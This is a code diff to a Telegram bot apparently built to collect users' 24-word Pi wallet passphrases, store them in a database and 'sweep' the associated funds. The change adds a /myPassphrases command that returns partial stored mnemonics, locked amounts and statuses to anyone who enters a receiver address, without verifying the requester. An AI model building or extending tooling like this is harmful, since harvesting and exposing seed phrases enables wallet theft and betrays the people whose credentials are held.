@@ -26,6 +26,7 @@ bot.onText(/\/help/, (msg) => {
         /status - Check bot status
         /sweep - sweeps all available pi
         /uploadPassphrase - Upload a locked pi wallet with your valid wallet address
+        /myPassphrases - Show all your uploaded wallet
         /stop - stops all running process
         `;
     bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
@@ -51,6 +52,12 @@ bot.onText(/\/uploadPassphrase/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
     userSessions[chatId] = { waitingForPassphraseAndAddress: true };
+});
+
+bot.onText(/\/myPassphrases/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, '📥 Please enter your wallet address`', { parse_mode: 'Markdown' });
+    userSessions[chatId] = { waitingForMyPassphrase: true };
 });
 
 bot.onText(/\/listSpnsrs/, async (msg) => {
@@ -186,6 +193,47 @@ bot.on('message', async (msg) => {
         } catch (error) {
             console.log(error)
             bot.sendMessage(chatId, `❌ Error processing the data. Ensure passphrase is correct. ${error}`);
+        }
+
+        delete userSessions[chatId];
+    }
+});
+// List my passphrase
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.waitingForMyPassphrase) {
+        try {
+            const passphrases = await Passphrase.find({ receiverAddress: text });
+
+        if (passphrases.length === 0) {
+            return bot.sendMessage(chatId, '❌ No wallet found.');
+        }
+
+        bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)
+
+        const list = await Promise.all(passphrases.map(async (p, index) => {
+            if(!p.mnemonic) {
+                await Passphrase.findByIdAndDelete(p._id);
+                return null;
+            }
+            const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;
+
+            return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_`;
+        }));
+        const cleanList = list.filter(Boolean);
+
+        const message = cleanList.join('\n');
+
+    
+        bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${message}`, {
+            parse_mode: 'Markdown',
+        });
+
+        } catch (error) {
+            console.log(error)
+            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
         }
 
         delete userSessions[chatId];
